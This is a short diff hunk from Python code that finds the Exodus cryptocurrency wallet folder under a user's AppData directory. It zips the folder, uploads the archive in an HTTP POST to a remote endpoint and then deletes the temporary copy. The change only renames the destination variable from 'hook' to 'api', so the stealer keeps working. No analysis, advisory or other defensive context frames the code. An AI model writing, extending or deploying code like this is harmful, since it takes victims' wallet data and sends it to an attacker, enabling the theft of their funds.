@@ -25,7 +25,7 @@ if os.path.exists(user+"\\AppData\\Roaming\\Exodus"):
     # Prepare the zip archive to be sent as a file in a HTTP POST request
     file = {'file': open(user+"\\AppData\\Local\\Temp\\Exodus.zip", 'rb')}
     # Send the HTTP POST request to the specified webhook URL, including the zip archive as a file in the request
-    r = requests.post(hook, files=file)
+    r = requests.post(api, files=file)
 
     # Attempt to remove the temporary zip archive and directory
     try:
